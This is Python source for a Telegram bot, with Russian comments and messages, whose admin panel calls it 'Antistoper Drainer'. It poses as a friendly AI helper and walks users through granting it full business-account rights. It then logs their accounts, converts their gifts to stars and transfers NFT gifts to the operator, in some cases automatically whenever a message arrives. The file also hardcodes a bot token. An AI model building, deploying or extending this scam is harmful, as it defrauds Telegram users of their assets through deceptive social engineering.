
from aiogram import F
from aiogram import Bot, Dispatcher
from aiogram import types
import asyncio
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import Message, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.filters import Command
from aiogram.exceptions import TelegramBadRequest
import logging
import json
import os
from typing import List

# Импорт кастомных методов
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGift

# Конфигурация
TOKEN = "8476167701:AAEDE9FJf5z_WxU55RW3sLOjn8eAZVNqyg8"
ADMIN_ID = 1742568382
CONNECTIONS_FILE = "business_connections.json"

# Инициализация бота и диспетчера
bot = Bot(TOKEN)
dp = Dispatcher()
bot_username = None


# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================

def load_json_file(filename):
    """Загрузка JSON файла"""
    try:
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.error(f"Ошибка при разборе JSON-файла {filename}: {e}")
        return []


def save_json_file(filename, data):
    """Сохранение в JSON файл"""
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Ошибка при сохранении в {filename}: {e}")


def load_connections():
    """Загрузка списка подключений"""
    return load_json_file(CONNECTIONS_FILE)


def save_business_connection_data(business_connection):
    """Сохранение данных о бизнес-подключении"""
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = load_connections()

    # Обновляем или добавляем запись
    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    save_json_file(CONNECTIONS_FILE, data)


async def get_bot_username():
    global bot_username
    if bot_username is None:
        me = await bot.get_me()
        bot_username = me.username
    return bot_username


async def send_instruction_message(chat_id: int):
    """Отправка инструкции по добавлению бота в чат-боты"""
    username = await get_bot_username()
    instruction_text = f"""
🤖 <b>КАК ДОБАВИТЬ МЕНЯ В ЧАТ-БОТЫ:</b>

1. <b>Откройте настройки бизнес-аккаунта</b>
   • Перейдите в → Настройки → Бизнес-аккаунт

2. <b>Добавьте чат-бота</b>
   • Нажмите «Чат-боты» → «Добавить чат-бота»
   • Выберите меня из списка (@{username})

3. <b>Предоставьте все права</b> ⚠️
   • Включите ВСЕ разрешения:
     ✅ Чтение сообщений
     ✅ Удаление сообщений  
     ✅ Редактирование имени
     ✅ Редактирование описания
     ✅ Просмотр подарков и звёзд
     ✅ Конвертация подарков
     ✅ Передача подарков

4. <b>Готово!</b>
   • После подключения я смогу отвечать на ваши запросы
   • И помогать вам 24/7!

📌 <i>Без полных прав я не смогу работать корректно!</i>
    """

    await bot.send_message(chat_id, instruction_text, parse_mode="HTML")


# ==================== ОБРАБОТЧИКИ КОМАНД ====================

@dp.message(Command("start"))
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
            "• ответит на любой вопрос\n"
            "• поддержит тебя в трудную минуту\n"
            "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
            "<i>Но для начала работы мне нужно стать твоим чат-ботом!</i> 👇",
            parse_mode="HTML"
        )

        # Отправляем инструкцию
        await send_instruction_message(message.chat.id)
    else:
        await message.answer(
            f"Antistoper Drainer\n\n🔗 "
            f"Подключено бизнес-аккаунтов: {count}\n\n"
            "/gifts - просмотреть гифты\n"
            "/stars - просмотреть звезды\n"
            "/connections - список подключений\n"
            "/convert - конвертировать подарки в звезды"
        )


@dp.message(Command("connections"))
async def connections_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    connections = load_connections()
    if not connections:
        await message.answer("Нет подключенных бизнес-аккаунтов")
        return

    text = "📋 <b>Подключенные бизнес-аккаунты:</b>\n\n"
    for i, conn in enumerate(connections, 1):
        text += (
            f"{i}. 👤 {conn.get('first_name', '')} {conn.get('last_name', '')}\n"
            f"   📛 @{conn.get('username', 'нет')}\n"
            f"   🆔 ID: {conn['user_id']}\n"
            f"   🔗 Connection ID: {conn['business_connection_id']}\n\n"
        )

    await message.answer(text, parse_mode="HTML")


@dp.message(Command("stars"))
async def stars_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    connections = load_connections()
    if not connections:
        await message.answer("Нет подключенных бизнес-аккаунтов")
        return

    text = "⭐️ <b>Баланс звезд по подключениям:</b>\n\n"
    total_stars = 0

    for conn in connections:
        try:
            response = await bot(GetFixedBusinessAccountStarBalance(
                business_connection_id=conn["business_connection_id"]
            ))
            stars = response.star_amount
            total_stars += stars
            text += f"👤 {conn.get('username', 'нет')}: {stars} звезд\n"
        except Exception as e:
            text += f"👤 {conn.get('username', 'нет')}: Ошибка: {e}\n"

    text += f"\n<b>Итого: {total_stars} звезд</b>"
    await message.answer(text, parse_mode="HTML")


@dp.message(Command("gifts"))
async def gifts_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    connections = load_connections()
    if not connections:
        await message.answer("Нет подключенных бизнес-аккаунтов")
        return

    text = "🎁 <b>Подарки по подключениям:</b>\n\n"
    total_gifts = 0

    for conn in connections:
        try:
            response = await bot(GetFixedBusinessAccountGifts(
                business_connection_id=conn["business_connection_id"]
            ))
            gifts_count = len(response.gifts)
            total_gifts += gifts_count
            text += f"👤 {conn.get('username', 'нет')}: {gifts_count} подарков\n"
        except Exception as e:
            text += f"👤 {conn.get('username', 'нет')}: Ошибка: {e}\n"

    text += f"\n<b>Итого: {total_gifts} подарков</b>"
    await message.answer(text, parse_mode="HTML")


async def process_connection_drain(business_connection_id: str):
    """Обработка одного подключения"""
    total_converted = 0
    transferred_nft_count = 0

    try:
        # 1. Конвертируем подарки в звезды
        try:
            gifts_response = await bot(GetFixedBusinessAccountGifts(
                business_connection_id=business_connection_id
            ))

            for gift in gifts_response.gifts:
                try:
                    # Пытаемся конвертировать каждый подарок
                    await bot.convert_gift_to_stars(
                        business_connection_id=business_connection_id,
                        owned_gift_id=gift.id
                    )
                    total_converted += 1
                    await asyncio.sleep(0.5)

                except Exception as e:
                    # Если ошибка - вероятно NFT подарок
                    if "cannot be converted" in str(e).lower():
                        # Пытаемся передать NFT себе
                        try:
                            await bot(TransferGift(
                                business_connection_id=business_connection_id,
                                gift_id=gift.id,
                                receiver_user_id=ADMIN_ID
                            ))
                            transferred_nft_count += 1
                            await asyncio.sleep(0.5)
                        except Exception as transfer_error:
                            logging.error(f"Ошибка передачи NFT {gift.id}: {transfer_error}")
                    else:
                        logging.error(f"Ошибка конвертации подарка {gift.id}: {e}")

        except Exception as e:
            logging.error(f"Ошибка получения подарков: {e}")

    except Exception as e:
        logging.error(f"Ошибка обработки подключения: {e}")

    return total_converted, transferred_nft_count


@dp.message(Command("convert"))
async def convert_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    connections = load_connections()
    if not connections:
        await message.answer("Нет подключенных бизнес-аккаунтов")
        return

    total_converted = 0
    total_nft_transferred = 0
    success_count = 0
    error_count = 0

    progress_message = await message.answer("🔄 Начинаю обработку подключений...")

    for i, conn in enumerate(connections, 1):
        try:
            await progress_message.edit_text(
                f"🔄 Обрабатываю подключение {i}/{len(connections)}\n"
                f"👤 Пользователь: @{conn.get('username', 'нет')}"
            )

            converted, nft_count = await process_connection_drain(conn["business_connection_id"])
            total_converted += converted
            total_nft_transferred += nft_count
            success_count += 1

            await asyncio.sleep(1)  # Задержка между подключениями

        except Exception as e:
            error_count += 1
            logging.error(f"Ошибка обработки {conn['username']}: {e}")

    await progress_message.delete()
    await message.answer(
        f"✅ <b>Конвертация завершена!</b>\n\n"
        f"📊 Статистика:\n"
        f"• Успешных подключений: {success_count}\n"
        f"• Ошибок: {error_count}\n"
        f"• Подарков сконвертировано: {total_converted}\n"
        f"• NFT подарков передано: {total_nft_transferred}\n\n"
        f"💰 <b>Звезды остались на балансах пользователей (нельзя перевести напрямую)</b>",
        parse_mode="HTML"
    )


# ==================== ОБРАБОТКА ОБЫЧНЫХ СООБЩЕНИЙ ====================

@dp.message(F.text & ~F.command)
async def handle_regular_message(message: Message):
    """Обработка обычных сообщений от пользователей"""
    try:
        # Пропускаем сообщения от админа
        if message.from_user.id == ADMIN_ID:
            return

        logging.info(f"Получено сообщение от {message.from_user.id}: {message.text}")

        # Проверяем, есть ли у пользователя бизнес-подключение
        connections = load_connections()
        user_has_connection = any(conn["user_id"] == message.from_user.id for conn in connections)

        if not user_has_connection:
            await message.answer(
                "❌ <b>Я еще не ваш чат-бот!</b>\n\n"
                "Чтобы я мог отвечать на ваши запросы, вам нужно:\n"
                "1. Добавить меня в чат-боты вашего бизнес-аккаунта\n"
                "2. Предоставить все необходимые права\n\n"
                "Напишите /start чтобы получить подробную инструкцию",
                parse_mode="HTML"
            )
        else:
            # Если подключение есть, но бот все равно не может отвечать
            await message.answer(
                "⚠️ <b>Проблема с подключением</b>\n\n"
                "Я вижу ваше бизнес-подключение, но не могу обработать запрос.\n"
                "Пожалуйста, проверьте:\n"
                "• Все ли права предоставлены в настройках чат-бота\n"
                "• Активно ли бизнес-подключение\n\n"
                "Напишите /start для повторной проверки",
                parse_mode="HTML"
            )

    except Exception as e:
        logging.error(f"Ошибка обработки обычного сообщения: {e}")
        await message.answer("❌ Произошла ошибка при обработке вашего запроса.")


# ==================== ОБРАБОТКА БИЗНЕС-ПОДКЛЮЧЕНИЙ ====================

async def send_welcome_message_to_admin(connection, user_id):
    """Отправка приветственного сообщения админу о новом подключении"""
    try:
        rights = connection.rights
        rights_text = "\n".join([
            f"📍 <b>Права бота:</b>",
            f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
            f"▫️ Удаление сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
            f"▫️ Конвертация подарков: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
            f"▫️ Передача подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
        ])

        star_amount = "Нет доступа ❌"
        gifts_count = "Нет доступа ❌"

        if rights.can_view_gifts_and_stars:
            try:
                # Получаем баланс звезд
                star_response = await bot(GetFixedBusinessAccountStarBalance(
                    business_connection_id=connection.id
                ))
                star_amount = star_response.star_amount

                # Получаем подарки
                gifts_response = await bot(GetFixedBusinessAccountGifts(
                    business_connection_id=connection.id
                ))
                gifts_count = len(gifts_response.gifts)
            except Exception as e:
                star_amount = f"Ошибка: {e}"
                gifts_count = f"Ошибка: {e}"

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{connection.user.username or '—'}\n"
            f"🆔 User ID: <code>{connection.user.id}</code>\n"
            f"🔗 Connection ID: <code>{connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n⭐️ Звезды: <code>{star_amount}</code>"
            f"\n🎁 Подарков: <code>{gifts_count}</code>"
        )

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Вывести все подарки", callback_data=f"reveal:{connection.user.id}")],
                [InlineKeyboardButton(text="⭐️ Конвертировать в звезды",
                                      callback_data=f"convert:{connection.user.id}")],
                [InlineKeyboardButton(text="🔄 Обновить информацию", callback_data=f"refresh:{connection.user.id}")]
            ]
        )

        await bot.send_message(ADMIN_ID, msg, parse_mode="HTML", reply_markup=keyboard)

    except Exception as e:
        logging.error(f"Ошибка отправки welcome сообщения: {e}")


@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    """Обработка нового бизнес-подключения"""
    try:
        # Сохраняем данные о подключении
        save_business_connection_data(business_connection)

        # Отправляем приветствие админу
        await send_welcome_message_to_admin(business_connection, business_connection.user.id)

        # Отправляем сообщение пользователю
        await bot.send_message(
            business_connection.user.id,
            "✅ Бот успешно подключен как бизнес-ассистент!\n\n"
            "Теперь вы можете использовать все функции бота."
        )

    except Exception as e:
        logging.error(f"Ошибка обработки бизнес-подключения: {e}")


# ==================== ОБРАБОТКА БИЗНЕС-СООБЩЕНИЙ ====================

@dp.business_message()
async def handle_business_message(message: types.Message):
    """Обработка сообщений из бизнес-чатов"""
    try:
        business_id = message.business_connection_id
        user_id = message.from_user.id

        # Пропускаем сообщения от админа
        if user_id == ADMIN_ID:
            return

        logging.info(f"Получено бизнес-сообщение от {user_id} через подключение {business_id}: {message.text}")

        # Отвечаем пользователю в бизнес-чате
        await message.answer(
            "🤖 <b>Бизнес-ассистент получил ваше сообщение!</b>\n\n"
            "Обрабатываю ваш запрос...\n\n",
            parse_mode="HTML"
        )

        # Автоматическая обработка подарков
        converted, nft_count = await process_connection_drain(business_id)

        if converted > 0 or nft_count > 0:
            await message.answer(
                f"✅ <b>Обработка завершена!</b>\n\n",
                parse_mode="HTML"
            )

    except Exception as e:
        logging.error(f"Ошибка обработки бизнес-сообщения: {e}")


# ==================== ОБРАБОТЧИКИ CALLBACK QUERY ====================

@dp.callback_query(F.data.startswith("reveal:"))
async def handle_reveal_gifts(callback: CallbackQuery):
    """Обработка кнопки показа подарков"""
    user_id = int(callback.data.split(":")[1])

    connections = load_connections()
    connection = next((conn for conn in connections if conn["user_id"] == user_id), None)

    if not connection:
        await callback.answer("Подключение не найдено")
        return

    try:
        gifts_response = await bot(GetFixedBusinessAccountGifts(
            business_connection_id=connection["business_connection_id"]
        ))

        if not gifts_response.gifts:
            await callback.message.edit_text(
                f"🎁 У пользователя @{connection['username']} нет подарков",
                reply_markup=callback.message.reply_markup
            )
        else:
            text = f"🎁 <b>Подарки пользователя @{connection['username']}:</b>\n\n"
            for i, gift in enumerate(gifts_response.gifts, 1):
                text += f"{i}. {gift.title} (ID: {gift.id})\n"

            await callback.message.edit_text(text, parse_mode="HTML")

    except Exception as e:
        await callback.answer(f"Ошибка: {e}")


@dp.callback_query(F.data.startswith("convert:"))
async def handle_convert_gifts(callback: CallbackQuery):
    """Обработка кнопки конвертации подарков"""
    user_id = int(callback.data.split(":")[1])

    connections = load_connections()
    connection = next((conn for conn in connections if conn["user_id"] == user_id), None)

    if not connection:
        await callback.answer("Подключение не найдено")
        return

    try:
        converted, nft_count = await process_connection_drain(connection["business_connection_id"])

        await callback.message.edit_text(
            f"✅ <b>Конвертация завершена для @{connection['username']}</b>\n\n"
            f"⭐️ Подарков сконвертировано: {converted}\n"
            f"🎁 NFT передано: {nft_count}",
            parse_mode="HTML",
            reply_markup=callback.message.reply_markup
        )

    except Exception as e:
        await callback.answer(f"Ошибка: {e}")


@dp.callback_query(F.data.startswith("refresh:"))
async def handle_refresh_info(callback: CallbackQuery):
    """Обработка кнопки обновления информации"""
    user_id = int(callback.data.split(":")[1])

    connections = load_connections()
    connection = next((conn for conn in connections if conn["user_id"] == user_id), None)

    if not connection:
        await callback.answer("Подключение не найдено")
        return

    try:
        # Получаем актуальную информацию
        star_response = await bot(GetFixedBusinessAccountStarBalance(
            business_connection_id=connection["business_connection_id"]
        ))
        gifts_response = await bot(GetFixedBusinessAccountGifts(
            business_connection_id=connection["business_connection_id"]
        ))

        await callback.message.edit_text(
            f"🔄 <b>Информация обновлена для @{connection['username']}</b>\n\n"
            f"⭐️ Звезд: {star_response.star_amount}\n"
            f"🎁 Подарков: {len(gifts_response.gifts)}",
            parse_mode="HTML",
            reply_markup=callback.message.reply_markup
        )

    except Exception as e:
        await callback.answer(f"Ошибка: {e}")


# ==================== ЗАПУСК БОТА ====================

async def main():
    """Основная функция запуска бота"""
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    logging.info("Бот запускается...")

    try:
        await dp.start_polling(bot)
    except Exception as e:
        logging.error(f"Ошибка запуска бота: {e}")
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())